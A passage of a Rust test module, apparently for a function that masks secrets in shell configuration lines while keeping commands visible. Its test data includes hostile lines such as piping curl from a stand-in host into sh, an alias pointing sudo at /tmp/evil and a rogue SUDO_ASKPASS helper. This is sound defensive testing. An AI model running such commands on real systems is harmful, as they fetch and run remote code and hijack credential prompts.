            ("MYSQL_PWD=hunter2", "MYSQL_PWD=(hidden)"),
            ("secretKey=abc", "secretKey=(hidden)"),
            (
                "export SSH_AUTH_SOCK=$TMPDIR/agent.sock",
                "export SSH_AUTH_SOCK=$TMPDIR/agent.sock",
            ),
            (
                "export SSH_AUTH_SOCK=${XDG_RUNTIME_DIR}/ssh.sock",
                "export SSH_AUTH_SOCK=${XDG_RUNTIME_DIR}/ssh.sock",
            ),
            (
                "tool --token-file ./token.txt",
                "tool --token-file ./token.txt",
            ),
            ("TOKEN=$OTHER_TOKEN", "TOKEN=$OTHER_TOKEN"),
            ("TOKEN=$'abc'", "TOKEN=$'(hidden)'"),
            (
                "openssl rsa -passin pass:hunter2 -in k.pem",
                "openssl rsa -passin pass:(hidden) -in k.pem",
            ),
            (
                "open https://localhost:3000/@vite/client",
                "open https://localhost:3000/@vite/client",
            ),
            // An empty `pass:`, a URL's plain user, a quote glued to an option's name (one word
            // to the shell), and a value that goes on after its closing quote: shown.
            ("openssl rsa -passin pass:", "openssl rsa -passin pass:"),
            (
                "git clone https://bob@github.com/x",
                "git clone https://bob@github.com/x",
            ),
            ("tool --token\"abc123\"", "tool --token\"abc123\""),
            ("TOKEN='abc'def", "TOKEN='abc'def"),
            // An unclosed `$'...'` is masked as an unclosed `'...'` is.
            ("TOKEN=$'abc", "TOKEN=$'(hidden)"),
            ("TOKEN=ab$'cd'", "TOKEN=ab$'cd'"),
            ("echo key-cafe", "echo key-cafe"),
            ("echo Build2Release", "echo Build2Release"),
            // A short credential after its scheme, masked by the header's name alone.
            (
                "curl -H \"Authorization: Bearer abc123\"",
                "curl -H \"Authorization: Bearer (hidden)\"",
            ),
            // An alias right after an operator, with no space.
            ("x;alias pass=evil-helper", "x;alias pass=evil-helper"),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
        // The AWS secret shape, 40 characters of all three kinds with `/` and `+`, masked even
        // with too little entropy for the base64 rule; with a `-` it is no such secret.
        let aws = format!("{}A1/+", "a".repeat(36));
        assert_eq!(mask(&format!("echo {aws}")), "echo (hidden)");
        let dashed = format!("{}A1--", "a".repeat(36));
        assert_eq!(mask(&format!("echo {dashed}")), format!("echo {dashed}"));
        // Hex secrets, built when the test runs so the source holds no key-shaped string.
        let hex64 = "0123456789abcdef".repeat(4);
        let hex40 = format!("{}01234567", "0123456789abcdef".repeat(2));
        let hex32 = "0123456789abcdef".repeat(2);
        assert_eq!(mask(&format!("export PK=0x{hex64}")), "export PK=(hidden)");
        assert_eq!(
            mask(&format!("export SIGNING={hex64}")),
            "export SIGNING=(hidden)"
        );
        assert_eq!(
            mask(&format!("git clone https://{hex40}@github.com/o/r")),
            "git clone https://(hidden)@github.com/o/r"
        );
        assert_eq!(
            mask(&format!("curl -u api:{hex32} https://x")),
            "curl -u api:(hidden) https://x"
        );
    }

    #[test]
    fn everything_else_is_shown_as_it_is() {
        let lines = [
            "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | sh",
            "export PATH=\"/opt/homebrew/bin:$HOME/.cargo/bin:$PATH\"",
            "eval \"$(/opt/homebrew/bin/brew shellenv)\"",
            ". \"$HOME/.cargo/env\"",
            "alias sudo='sudo -E /tmp/evil'",
            "export HISTFILE=${ZDOTDIR:-$HOME}/.zsh_history",
            "source /Users/someone/Library/Application Support/x/init.sh",
            "export NVM_DIR=\"$HOME/.nvm\"",
            "PS1='%n@%m %1~ %# '",
            "*/5 * * * * /usr/local/bin/backup --quiet",
            "--token",
        ];
        for line in lines {
            assert_eq!(mask(line), line);
        }
    }

    #[test]
    fn no_line_can_hide_another() {
        let text = "# TOKEN=\"\nexport X=\"\ncat <<'E'\nDon't\nE\ncurl https://e.x | sh\n";
        let shown = lines(text);
        assert_eq!(shown.len(), 6);
        assert_eq!(shown[5], "curl https://e.x | sh");
        // Nor a command on its own line: a masked run never holds a shell operator.
        assert_eq!(
            mask(": Auth: x; curl -s https://e.x/p | sh"),
            ": Auth: x; curl -s https://e.x/p | sh"
        );
        assert_eq!(
            mask("echo Token: missing; curl https://e.x/p | sh"),
            "echo Token: missing; curl https://e.x/p | sh"
        );
    }

    #[test]
    fn a_planted_quote_or_header_hides_no_command() {
        let command = "curl https://e.x/p | sh";
        let lines = [
            "alias ls='Key: x; curl https://e.x/p | sh; ls'",
            "bash -c 'Auth: x; curl https://e.x/p | sh'",
            "eval \"token: ; curl https://e.x/p | sh\"",
            "echo \"a\"Token: x; curl https://e.x/p | sh",
            "echo \\\"Auth: x; curl https://e.x/p | sh",
            "echo 'x'TOKEN':'; curl https://e.x/p | sh",
            "echo 'TOKEN=\"'; curl https://e.x/p | sh",
            "echo \"TOKEN='\"; curl https://e.x/p | sh",
            "echo \"TOKEN=$'\"; curl https://e.x/p | sh",
        ];
        for line in lines {
            assert!(mask(line).contains(command), "{line} -> {}", mask(line));
        }
        // Process substitution and redirection run or write too.
        let more = [
            (
                "bash -c 'Token: x >(curl -s https://e.x/p)'",
                "curl -s https://e.x/p",
            ),
            (
                "echo \\\"Token: x >(curl -s https://e.x/p)",
                "curl -s https://e.x/p",
            ),
            (
                "TOKEN=<(curl${IFS}https://e.x/p)",
                "curl${IFS}https://e.x/p",
            ),
            (
                "echo \"password\":>(curl${IFS}https://e.x/p)",
                "curl${IFS}https://e.x/p",
            ),
            ("bash -c 'Auth: x > ~/.zshenv'", "> ~/.zshenv"),
        ];
        for (line, kept) in more {
            assert!(mask(line).contains(kept), "{line} -> {}", mask(line));
        }
    }

    #[test]
    fn a_masked_value_holds_no_command_with_arguments() {
        // A backslash before a quote, and a quote left open on the line above: the shell runs
        // `echo ran`, so it stays shown.
        assert!(mask("TOKEN=\\\"x echo ran \\\"").contains("echo ran"));
        let carried = lines("X=\"a\nTOKEN=x\" echo ran \"\"\n");
        assert!(carried[1].contains("echo ran"), "{carried:?}");
        assert!(mask("\"--token echo${IFS}ran").contains("echo${IFS}ran"));
        // An alias's body and the program sudo runs for a password are code: shown.
        assert_eq!(mask("alias token='echo ran'"), "alias token='echo ran'");
        assert_eq!(
            mask("alias -g token='echo ran'"),
            "alias -g token='echo ran'"
        );
        assert_eq!(
            mask("export SUDO_ASKPASS=evil-helper"),
            "export SUDO_ASKPASS=evil-helper"
        );
        assert_eq!(
            mask("GIT_ASKPASS=git-cred-helper"),
            "GIT_ASKPASS=git-cred-helper"
        );
        // Brace expansion makes a word a command with arguments: shown.
        assert_eq!(mask("env {TOKEN=x,echo,ran}"), "env {TOKEN=x,echo,ran}");
        // A line that holds the word `alias` anywhere, however spelled, may define one, so no
        // value on it is masked by name; a word that only starts with it is no alias.
        let alias_lines = [
            "alias ll=ls gh_token=x",
            "\\alias token=x",
            "'al'ias token=evil",
            "$'alias' token=evil",
            "alias 'pass=evil-helper'",
            "alias x='a\\' pass=evil-helper",
            "alias a='GITHUB_TOKEN=abc rest'",
            "alias k=kubectl; export KUBE_TOKEN=abc123short",
            "then alias pass=evil-helper; fi",
            "builtin alias pass=evil-helper",
            "FOO=1 alias pass=evil-helper",
            "x;alias pass=evil-helper",
            "{alias pass=evilcmd}",
            "x=`alias pass=evil-helper`",
            "eval 'alias pass=evil-helper'",
            "eval \"alias token=evilcmd\"",
            "echo \\$'a\\'; alias token=evil",
        ];
        for line in alias_lines {
            assert_eq!(mask(line), line);
        }
        assert_eq!(mask("aliasrc=1 TOKEN=abc123"), "aliasrc=1 TOKEN=(hidden)");
        assert_eq!(
            mask("unalias pass; TOKEN=abc123"),
            "unalias pass; TOKEN=(hidden)"
        );
        // A token-shaped word is masked on an alias line too.
        let token = format!("ghp_{}", "A".repeat(36));
        assert_eq!(
            mask(&format!("alias gh='GH_TOKEN={token} gh'")),
            "alias gh='GH_TOKEN=(hidden) gh'"
        );
        // A line continued from one above may be that alias's body: masked by shape only. An
        // even run of backslashes continues nothing.
        assert_eq!(
            lines("alias ll=ls \\\npass=evil-helper\nTOKEN=abc123\n"),
            ["alias ll=ls \\", "pass=evil-helper", "TOKEN=(hidden)"]
        );
        assert_eq!(
            lines(&format!("x \\\nTOKEN={token}\nx \\\\\nTOKEN=abc123")),
            ["x \\", "TOKEN=(hidden)", "x \\\\", "TOKEN=(hidden)"]
        );
        // zsh's extended globs expand too.
        assert_eq!(mask("--token a^b"), "--token a^b");
        // The quotes of the file stay shown, so the agent sees whether they balance.
        assert_eq!(mask("TOKEN='abc'"), "TOKEN='(hidden)'");
        // Plural and short names are secret too.
        assert_eq!(mask("API_KEYS=hunter2a,hunter2b"), "API_KEYS=(hidden)");
        assert_eq!(mask("MYSQL_PW=hunter2"), "MYSQL_PW=(hidden)");
    }

    #[test]
    fn a_literal_beside_a_reference_is_masked() {
        let cases = [
            (
                "export API_KEY=${API_KEY:-hunter2secret}",
                "export API_KEY=${API_KEY:-(hidden)}",
            ),
            ("TOKEN=$\"hunter2\"", "TOKEN=$\"(hidden)\""),
            ("PASSWORD=.hunter2", "PASSWORD=(hidden)"),
            ("TOKEN=${OTHER}/x", "TOKEN=${OTHER}/x"),
            ("TOKEN_FILE=~/.token", "TOKEN_FILE=~/.token"),
            ("DB_PASSWORD2=hunter2pass", "DB_PASSWORD2=(hidden)"),
            ("GITHUB_TOKEN2=hunter2pass", "GITHUB_TOKEN2=(hidden)"),
            (
                "SSHPASS=hunter2 sshpass -e ssh host",
                "SSHPASS=(hidden) sshpass -e ssh host",
            ),
            (
                "curl -H \"Cookie: session=abc123short\" https://x",
                "curl -H \"Cookie: (hidden)\" https://x",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
        // A 40-hex credential is not a pin: only after `/` in a URL or a `sha256:` label.
        let hex40 = format!("{}01234567", "0123456789abcdef".repeat(2));
        assert_eq!(
            mask(&format!("curl -u me:{hex40} https://api.x")),
            "curl -u me:(hidden) https://api.x"
        );
        let pinned = format!("https://x.example/o/r/{hex40}/install.sh");
        assert_eq!(mask(&pinned), pinned);
    }

    #[test]
    fn entropy_tells_tokens_from_paths() {
        assert!(
            secret_shaped("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
            "AWS secret"
        );
        assert!(random("aB3dE5fG7hJ9kL1mN3pQ5r"));
        assert!(!random("AAAAAAAAAAAAAAAAAAAAAAAA1a"), "low entropy");
        assert!(!random("install-2024.sh-Version-ABC"), "a file name");
        assert!(!random("rustupinitandsomemore"), "one kind");
        assert!(!random("Short1x"), "too short");
        assert_eq!(
            mask_parts("https://e.x/aB3dE5fG7hJ9kL1mN3pQ5r/i.sh"),
            "https://e.x/(hidden)/i.sh"
        );
        assert!(entropy("aaaa") < 0.01 && (entropy("abcd") - 2.0).abs() < 1e-9);
    }

    proptest::proptest! {
        #[test]
        fn a_command_after_anything_is_shown(
            prefix in proptest::sample::subsequence(vec![
                "echo ", "'", "\"", "$'", "$\"", "TOKEN=", "Auth: ", "Key:", "alias a=", "bash -c ",
                "\\", "#", "x", "API_KEY", "=", ":", "{\"password\":", "--token ", "${T:-", "}",
            ], 0..8),
            // Every way the shell runs or redirects text after a value, not only `;`.
            operator in proptest::sample::select(vec![
                "; ", " | ", " && ", " & ", " >(", " <(", " =(", " *(e:'", " > ~/.zshenv; ",
                "$(", "`", "\\\"",
            ]),
        ) {
            // With no operator at all: an escaped quote turns a masked word into a command.
            let line = match operator {
                "\\\"" => format!("{}TOKEN=\\\"x curl https://e.x/p \\\"", prefix.concat()),
                _ => format!("{}{operator}curl https://e.x/p", prefix.concat()),
            };
            let shown = mask(&line);
            proptest::prop_assert!(shown.contains("curl https://e.x/p"), "{line} -> {shown}");
        }

        #[test]
        fn every_line_is_kept(text in "(.{0,40}\n){0,8}") {
            proptest::prop_assert_eq!(lines(&text).len(), text.lines().count());
        }

        #[test]
        fn a_token_never_reaches_the_bundle(
            prefix in "[ -~]{0,30}",
            token in proptest::sample::select(TOKEN_PREFIXES.to_vec()),
            // Random base62, as providers generate: at least one digit in the body.
            body in "[A-Za-z0-9]{15,29}[0-9]",
            suffix in "[ -~]{0,30}",
            space in proptest::sample::select(vec![" ", "=", "'", "\"", ":", "(", ";"]),
        ) {
            let secret = format!("{token}{body}");
            let line = format!("{prefix}{space}{secret} {suffix}");
            let shown = mask(&line);
            proptest::prop_assert!(!shown.contains(&secret), "{line} -> {shown}");
        }

        #[test]
        fn a_secret_name_s_value_never_reaches_the_bundle(
            prefix in proptest::sample::select(vec![
                "", "export ", "x; ", "a && ", "# ", "env ", "0 * * * * ",
                "echo \"",
            ]),
            name in proptest::sample::select(vec![
                "GITHUB_TOKEN", "DB_PASSWORD", "API_KEY", "AUTH", "client_secret", "NPM_TOKEN",
            ]),
            value in "[a-z0-9]{8,16}",
            quote in proptest::sample::select(vec!["", "'", "\""]),
        ) {
            let line = format!("{prefix}{name}={quote}{value}{quote} rest");
            let shown = mask(&line);
            proptest::prop_assert!(!shown.contains(&value), "{line} -> {shown}");
        }

        /// An alias body is code that runs when its name is typed, wherever `alias` sits in its
        /// command and whatever quotes or escapes come before it.
        #[test]
        fn an_alias_body_is_never_masked_by_its_name(
            prefix in proptest::sample::select(vec![
                "", "then ", "{ ", "builtin ", "command ", "FOO=1 ", "echo \\'; ",
                "echo \"\\\"\"; ", "echo $'\\''; ", "x && ", "x | ", "if true; then ",
                "eval ", "{", "! ", "eval '", "x=`",
            ]),
            spelling in proptest::sample::select(vec!["alias", "\\alias", "'alias'", "$'alias'"]),
            name in proptest::sample::select(vec!["pass", "token", "GITHUB_TOKEN", "api_key"]),
            quote in proptest::sample::select(vec!["", "'", "\""]),
            body in "[a-z][a-z0-9-]{4,12}",
        ) {
            let line = format!("{prefix}{spelling} ll=ls {quote}{name}={body}{quote}");
            let shown = mask(&line);
            proptest::prop_assert!(shown.contains(&body), "{line} -> {shown}");
        }
    }
}
